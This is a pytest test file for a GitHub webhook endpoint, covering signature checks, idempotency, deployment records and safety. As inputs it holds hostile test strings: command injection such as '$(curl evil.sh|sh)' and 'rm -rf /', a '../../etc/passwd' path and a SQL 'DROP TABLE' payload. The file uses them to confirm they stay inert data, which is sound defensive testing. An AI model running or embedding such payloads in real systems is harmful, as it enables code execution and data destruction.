"""Phase 11: POST /api/webhooks/github (signature, parsing, idempotency, correlation, safety)."""

import asyncio
import json
import logging
import uuid
from datetime import UTC, datetime, timedelta
from typing import Any

import pytest
from httpx import AsyncClient, Response
from pydantic import SecretStr
from sqlalchemy import func, select
from sqlalchemy.ext.asyncio import AsyncSession

from app.api.routes.webhooks import MAX_PAYLOAD_BYTES
from app.core.config import get_settings
from app.github.demo import DEMO_REPOSITORY, RELEASE_SHA, demo_deliveries
from app.github.security import sign
from app.models import AgentEvent, CicdEvent, Deployment, Incident

pytestmark = pytest.mark.usefixtures("clean_demo")

SECRET = "test-webhook-secret-value"
URL = "/api/webhooks/github"
SHA = "a1b2c3d4e5f60718293a4b5c6d7e8f9012345678"


@pytest.fixture(autouse=True)
def webhook_secret(monkeypatch: pytest.MonkeyPatch) -> None:
    settings = get_settings()
    monkeypatch.setattr(settings, "github_webhook_secret", SecretStr(SECRET))
    monkeypatch.setattr(settings, "github_repository", None)
    monkeypatch.setattr(settings, "github_service", "payment-api")


def iso(ts: datetime) -> str:
    return ts.strftime("%Y-%m-%dT%H:%M:%SZ")


def push(ref: str = "refs/heads/main", sha: str = SHA, **extra: Any) -> dict[str, Any]:
    commit = {
        "id": sha,
        "message": "Tune connection pool\n\nLonger body that is not stored.",
        "timestamp": iso(datetime.now(UTC) - timedelta(minutes=5)),
        "author": {"name": "Dev Bob", "username": "dev-bob", "email": "bob@example.com"},
        "added": ["a.txt"],
        "removed": [],
        "modified": ["config/production.yaml"],
    }
    return {
        "ref": ref,
        "before": "0" * 40,
        "after": sha,
        "repository": {"full_name": DEMO_REPOSITORY},
        "head_commit": commit,
        "commits": [commit],
        "sender": {"login": "dev-bob"},
    } | extra


def workflow_run(
    name: str = "deploy-production",
    conclusion: str | None = "success",
    status: str = "completed",
    run_id: int = 42,
    head_branch: str = "main",
    sha: str = SHA,
    repository: str = DEMO_REPOSITORY,
) -> dict[str, Any]:
    now = datetime.now(UTC)
    return {
        "action": "completed",
        "workflow_run": {
            "id": run_id,
            "name": name,
            "path": f".github/workflows/{name}.yml",
            "run_number": 7,
            "run_attempt": 1,
            "head_branch": head_branch,
            "head_sha": sha,
            "status": status,
            "conclusion": conclusion,
            "created_at": iso(now - timedelta(minutes=3)),
            "run_started_at": iso(now - timedelta(minutes=3)),
            "updated_at": iso(now - timedelta(minutes=1)),
            "html_url": f"https://github.com/{repository}/actions/runs/{run_id}",
            "actor": {"login": "release-bot"},
        },
        "repository": {"full_name": repository},
    }


async def send(
    client: AsyncClient,
    event: str,
    payload: dict[str, Any] | bytes,
    *,
    delivery: str | None = None,
    signature: str | None = None,
    headers: dict[str, str] | None = None,
) -> Response:
    body = payload if isinstance(payload, bytes) else json.dumps(payload).encode()
    all_headers = {
        "Content-Type": "application/json",
        "X-GitHub-Event": event,
        "X-GitHub-Delivery": delivery or str(uuid.uuid4()),
        "X-Hub-Signature-256": signature if signature is not None else sign(SECRET, body),
    } | (headers or {})
    return await client.post(URL, content=body, headers=all_headers)


async def count(db: AsyncSession, model: type, *where: Any) -> int:
    return await db.scalar(select(func.count()).select_from(model).where(*where)) or 0


# --- signature ----------------------------------------------------------------------------------


async def test_valid_signature_push_is_recorded(client: AsyncClient, db: AsyncSession) -> None:
    response = await send(client, "push", push(), delivery="delivery-push-1")

    assert response.status_code == 201
    body = response.json()
    assert body["status"] == "recorded" and body["delivery_id"] == "delivery-push-1"
    event = body["event"]
    assert event["category"] == "COMMIT" and event["event_type"] == "push"
    assert (event["repository"], event["branch"], event["commit_sha"]) == (
        DEMO_REPOSITORY,
        "main",
        SHA,
    )
    assert event["commit_message"] == "Tune connection pool"  # first line only
    assert event["actor"] == "dev-bob" and event["service_name"] == "payment-api"
    assert event["version"] is None and event["deployment_id"] is None
    assert event["metadata"]["changed_files"] == ["a.txt", "config/production.yaml"]
    stored = await db.scalar(select(CicdEvent).where(CicdEvent.delivery_id == "delivery-push-1"))
    assert stored is not None and stored.commit_sha == SHA


@pytest.mark.parametrize(
    "signature",
    [
        "",  # missing
        "sha1=" + "a" * 40,  # wrong algorithm
        "sha256=xyz",  # malformed
        "sha256=" + "0" * 64,  # well-formed but wrong
    ],
)
async def test_bad_signatures_are_rejected(
    client: AsyncClient, db: AsyncSession, signature: str
) -> None:
    headers = {} if signature else {"X-Hub-Signature-256": ""}
    response = await send(client, "push", push(), signature=signature, headers=headers)

    assert response.status_code == 401
    assert SECRET not in response.text and "sha256=" not in response.json()["detail"]
    assert await count(db, CicdEvent) == 0


async def test_signature_from_another_secret_is_rejected(client: AsyncClient) -> None:
    body = json.dumps(push()).encode()
    response = await send(client, "push", body, signature=sign("another-secret", body))
    assert response.status_code == 401
    assert response.json()["detail"] == "Invalid webhook signature"


async def test_modified_payload_is_rejected(client: AsyncClient, db: AsyncSession) -> None:
    original = json.dumps(push()).encode()
    tampered = original.replace(b"refs/heads/main", b"refs/heads/evil")
    response = await send(client, "push", tampered, signature=sign(SECRET, original))
    assert response.status_code == 401
    assert await count(db, CicdEvent) == 0


async def test_signature_covers_the_raw_bytes(client: AsyncClient) -> None:
    """Whitespace/key order are part of the signed bytes: no re-serialization before checking."""
    raw = (
        b'{ "ref":"refs/heads/main" ,\n "after": "'
        + SHA.encode()
        + (b'", "repository": {"full_name": "' + DEMO_REPOSITORY.encode() + b'"} }')
    )
    assert (await send(client, "push", raw)).status_code == 201


async def test_unconfigured_secret_rejects_everything(
    client: AsyncClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(get_settings(), "github_webhook_secret", None)
    response = await send(client, "push", push())
    assert response.status_code == 503
    status = (await client.get(f"{URL}/status")).json()
    assert status["configured"] is False


# --- headers, body, events ----------------------------------------------------------------------


async def test_ping(client: AsyncClient, db: AsyncSession) -> None:
    response = await send(client, "ping", {"zen": "Keep it logically awesome.", "hook_id": 1})
    assert response.status_code == 200 and response.json()["status"] == "pong"
    assert await count(db, CicdEvent) == 0


async def test_unsupported_event_is_ignored(client: AsyncClient, db: AsyncSession) -> None:
    response = await send(client, "issues", {"action": "opened"})
    assert response.status_code == 202
    assert response.json()["status"] == "ignored" and response.json()["event"] is None
    assert await count(db, CicdEvent) == 0


@pytest.mark.parametrize(
    ("headers", "body", "code"),
    [
        ({"X-GitHub-Event": ""}, None, 400),
        ({"X-GitHub-Event": "push; rm -rf /"}, None, 400),
        ({"X-GitHub-Delivery": ""}, None, 400),
        ({"X-GitHub-Delivery": "../../etc/passwd"}, None, 400),
        ({}, b"not json", 400),
        ({}, b"[1, 2, 3]", 400),
        ({}, json.dumps({"repository": {"full_name": DEMO_REPOSITORY}}).encode(), 422),
        ({}, json.dumps(push() | {"repository": {"full_name": "<script>"}}).encode(), 422),
    ],
)
async def test_invalid_requests(
    client: AsyncClient, db: AsyncSession, headers: dict[str, str], body: bytes | None, code: int
) -> None:
    response = await send(client, "push", body if body is not None else push(), headers=headers)
    assert response.status_code == code
    assert await count(db, CicdEvent) == 0


async def test_oversized_payload_is_rejected(client: AsyncClient) -> None:
    body = b'{"padding": "' + b"x" * MAX_PAYLOAD_BYTES + b'"}'
    response = await send(client, "push", body)
    assert response.status_code == 413


async def test_missing_optional_fields(client: AsyncClient) -> None:
    minimal = {"workflow_run": {"id": 5}, "repository": {"full_name": DEMO_REPOSITORY}}
    response = await send(client, "workflow_run", minimal)

    assert response.status_code == 201
    event = response.json()["event"]
    assert event["status"] == "QUEUED" and event["conclusion"] is None
    assert event["category"] == "BUILD" and event["commit_sha"] is None
    assert event["workflow_name"] is None and event["html_url"] is None


# --- idempotency --------------------------------------------------------------------------------


async def test_duplicate_delivery_is_idempotent(client: AsyncClient, db: AsyncSession) -> None:
    first = await send(client, "workflow_run", workflow_run(), delivery="dup-1")
    second = await send(client, "workflow_run", workflow_run(), delivery="dup-1")

    assert (first.status_code, second.status_code) == (201, 200)
    assert second.json()["status"] == "duplicate"
    assert second.json()["event"]["id"] == first.json()["event"]["id"]
    assert await count(db, CicdEvent) == 1
    assert await count(db, Deployment, Deployment.commit_sha == SHA) == 1


async def test_concurrent_duplicate_deliveries_store_one(
    client: AsyncClient, db: AsyncSession
) -> None:
    responses = await asyncio.gather(
        *(send(client, "workflow_run", workflow_run(), delivery="race-1") for _ in range(3))
    )

    assert sorted(r.status_code for r in responses) == [200, 200, 201]
    assert len({r.json()["event"]["id"] for r in responses}) == 1
    assert await count(db, CicdEvent) == 1
    assert await count(db, Deployment, Deployment.commit_sha == SHA) == 1


async def test_two_deliveries_of_one_run_create_one_deployment(
    client: AsyncClient, db: AsyncSession
) -> None:
    first = await send(client, "workflow_run", workflow_run(), delivery="run-a")
    second = await send(client, "workflow_run", workflow_run(), delivery="run-b")

    assert (first.status_code, second.status_code) == (201, 201)
    assert first.json()["event"]["deployment_id"] == second.json()["event"]["deployment_id"]
    assert await count(db, Deployment, Deployment.commit_sha == SHA) == 1


# --- deployment telemetry -----------------------------------------------------------------------


async def test_successful_production_deploy_creates_a_deployment(
    client: AsyncClient, db: AsyncSession
) -> None:
    tag = await send(client, "push", push(ref="refs/tags/v1.9.0", commits=[]))
    run = await send(client, "workflow_run", workflow_run())

    assert tag.json()["event"]["version"] == "v1.9.0"
    event = run.json()["event"]
    assert event["category"] == "DEPLOYMENT" and event["environment"] == "production"
    assert (event["version"], event["version_source"]) == ("v1.9.0", "tag")
    deployment = await db.get(Deployment, event["deployment_id"])
    assert deployment is not None
    assert (deployment.service_name, deployment.version, deployment.commit_sha) == (
        "payment-api",
        "v1.9.0",
        SHA,
    )
    assert deployment.status == "SUCCEEDED"
    listed = (await client.get("/api/services/payment-api/deployments")).json()
    assert listed[0]["version"] == "v1.9.0"


async def test_version_is_never_invented(client: AsyncClient, db: AsyncSession) -> None:
    event = (await send(client, "workflow_run", workflow_run())).json()["event"]

    assert event["version"] is None and event["version_source"] is None
    deployment = await db.get(Deployment, event["deployment_id"])
    assert deployment is not None and deployment.version == SHA[:7]  # the commit, not a semver


@pytest.mark.parametrize(
    ("name", "conclusion", "category"),
    [
        ("deploy-production", "failure", "DEPLOYMENT"),
        ("deploy-production", "cancelled", "DEPLOYMENT"),
        ("deploy-staging", "success", "DEPLOYMENT"),
        ("deploy", "success", "DEPLOYMENT"),  # environment unknown: not assumed production
        ("Backend CI", "success", "BUILD"),
        ("Run tests", "success", "TEST"),
    ],
)
async def test_only_successful_production_deploys_become_deployments(
    client: AsyncClient, db: AsyncSession, name: str, conclusion: str, category: str
) -> None:
    before = await count(db, Deployment)
    event = (await send(client, "workflow_run", workflow_run(name, conclusion))).json()["event"]

    assert event["category"] == category and event["deployment_id"] is None
    assert await count(db, Deployment) == before


async def test_in_progress_deploy_is_evidence_only(client: AsyncClient, db: AsyncSession) -> None:
    event = (
        await send(client, "workflow_run", workflow_run(conclusion=None, status="in_progress"))
    ).json()["event"]
    assert (event["status"], event["conclusion"], event["deployment_id"]) == (
        "IN_PROGRESS",
        None,
        None,
    )


async def test_deployment_status_with_explicit_metadata(
    client: AsyncClient, db: AsyncSession
) -> None:
    now = iso(datetime.now(UTC))
    payload = {
        "deployment_status": {"state": "success", "environment": "production", "updated_at": now},
        "deployment": {
            "id": 77,
            "sha": SHA,
            "ref": "main",
            "environment": "production",
            "payload": {"service": "auth-api", "version": "v2.4.0"},
            "created_at": now,
        },
        "repository": {"full_name": DEMO_REPOSITORY},
    }
    event = (await send(client, "deployment_status", payload)).json()["event"]

    assert (event["service_name"], event["version"], event["version_source"]) == (
        "auth-api",
        "v2.4.0",
        "deployment_payload",
    )
    deployment = await db.get(Deployment, event["deployment_id"])
    assert deployment is not None and deployment.service_name == "auth-api"


async def test_replayed_demo_deploy_links_to_the_existing_deployment(
    client: AsyncClient, db: AsyncSession
) -> None:
    incident_id = (await client.post("/api/incidents/simulate")).json()["id"]

    events = (await client.get("/api/cicd/events", params={"service": "payment-api"})).json()
    deploy = next(e for e in events if e["event_type"] == "workflow_run")
    assert deploy["commit_sha"] == RELEASE_SHA
    assert (deploy["version"], deploy["version_source"]) == ("v1.8.2", "tag")
    linked = await db.get(Deployment, deploy["deployment_id"])
    assert linked is not None and (linked.version, linked.commit_sha) == ("v1.8.2", "e4a7c52")
    assert await count(db, Deployment, Deployment.version == "v1.8.2") == 1  # no duplicate
    timeline = (await client.get(f"/api/incidents/{incident_id}/events")).json()
    detected = [e for e in timeline if e["event_type"] == "deployment_detected"]
    assert len(detected) == 1 and "v1.8.2" in detected[0]["message"]


async def test_redelivering_the_demo_changes_nothing(client: AsyncClient, db: AsyncSession) -> None:
    incident_id = (await client.post("/api/incidents/simulate")).json()["id"]
    incident = await db.get(Incident, incident_id)
    assert incident is not None
    before = (await count(db, CicdEvent), await count(db, Deployment), await count(db, AgentEvent))

    for event_type, delivery_id, payload in demo_deliveries(incident.created_at):
        response = await send(client, event_type, payload, delivery=delivery_id)
        assert response.status_code == 200 and response.json()["status"] == "duplicate"

    after = (await count(db, CicdEvent), await count(db, Deployment), await count(db, AgentEvent))
    assert after == before


# --- incidents ----------------------------------------------------------------------------------


async def test_ci_failure_never_creates_an_incident(client: AsyncClient, db: AsyncSession) -> None:
    await send(client, "workflow_run", workflow_run("deploy-production", "failure"))
    await send(client, "workflow_run", workflow_run("Backend CI", "failure", run_id=43))
    assert await count(db, Incident) == 0


async def test_event_reaches_the_active_incident_timeline(
    client: AsyncClient, db: AsyncSession
) -> None:
    incident_id = (await client.post("/api/incidents/simulate")).json()["id"]
    await send(client, "workflow_run", workflow_run("Backend CI", "failure", run_id=99))

    timeline = (await client.get(f"/api/incidents/{incident_id}/events")).json()
    last = timeline[-1]
    assert last["event_type"] == "cicd_event_recorded" and last["agent"] is None
    assert "Backend CI" in last["message"] and "FAILURE" in last["message"]
    assert last["metadata"]["source"] == "github"
    incident = (await client.get(f"/api/incidents/{incident_id}")).json()
    assert incident["status"] == "DETECTED"  # evidence only; the lifecycle is untouched
    assert await count(db, Incident) == 1


# --- repository allowlist -----------------------------------------------------------------------


async def test_configured_repository(
    client: AsyncClient, db: AsyncSession, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(get_settings(), "github_repository", "acme/payments")
    monkeypatch.setattr(get_settings(), "github_service", "auth-api")

    other = await send(client, "workflow_run", workflow_run(repository="someone/else"))
    ours = await send(client, "workflow_run", workflow_run(repository="acme/payments", run_id=9))

    assert other.status_code == 202 and other.json()["status"] == "ignored"
    assert ours.status_code == 201 and ours.json()["event"]["service_name"] == "auth-api"
    assert await count(db, CicdEvent) == 1


# --- safety -------------------------------------------------------------------------------------


async def test_secret_never_appears_in_logs_or_responses(
    client: AsyncClient, caplog: pytest.LogCaptureFixture
) -> None:
    caplog.set_level(logging.DEBUG)
    bodies = [
        (await send(client, "push", push())).text,
        (await send(client, "push", push(), signature="sha256=" + "1" * 64)).text,
        (await client.get(f"{URL}/status")).text,
        (await client.get("/api/cicd/events")).text,
    ]
    for text in [*bodies, caplog.text]:
        assert SECRET not in text
    status = json.loads(bodies[2])
    assert status["configured"] is True
    assert set(status) == {
        "configured",
        "repository",
        "service",
        "supported_events",
        "max_payload_bytes",
    }


async def test_headers_and_raw_payload_are_not_persisted(
    client: AsyncClient, db: AsyncSession
) -> None:
    payload = push(installation={"id": 1, "access_token": "ghs_SENSITIVE_TOKEN"})
    payload["repository"]["private_key"] = "SENSITIVE-MARKER"
    response = await send(
        client, "push", payload, headers={"Authorization": "Bearer ghp_AUTH_HEADER_TOKEN"}
    )

    assert response.status_code == 201
    row = await db.scalar(select(CicdEvent))
    assert row is not None
    stored = json.dumps(
        {c.key: str(getattr(row, c.key)) for c in CicdEvent.__mapper__.column_attrs}
    )
    for marker in ("ghs_SENSITIVE_TOKEN", "SENSITIVE-MARKER", "ghp_AUTH_HEADER_TOKEN", "@"):
        assert marker not in stored  # "@": the author's e-mail is never stored
    assert "Longer body" not in stored


async def test_malicious_strings_are_only_data(
    client: AsyncClient, db: AsyncSession, monkeypatch: pytest.MonkeyPatch
) -> None:
    import os
    import subprocess

    def forbidden(*_: Any, **__: Any) -> None:
        raise AssertionError("webhook processing must never execute anything")

    for module, name in ((subprocess, "run"), (subprocess, "Popen"), (os, "system")):
        monkeypatch.setattr(module, name, forbidden)

    payload = push(ref="refs/heads/main;$(curl evil.sh|sh)")
    payload["head_commit"]["message"] = "'; DROP TABLE incidents; -- \x00 `rm -rf /`"
    response = await send(client, "push", payload)

    assert response.status_code == 201
    event = response.json()["event"]
    assert event["branch"] == "main;$(curl evil.sh|sh)"
    assert event["commit_message"] == "'; DROP TABLE incidents; --   `rm -rf /`"  # NUL removed
    assert (await client.get("/api/incidents")).status_code == 200  # table intact
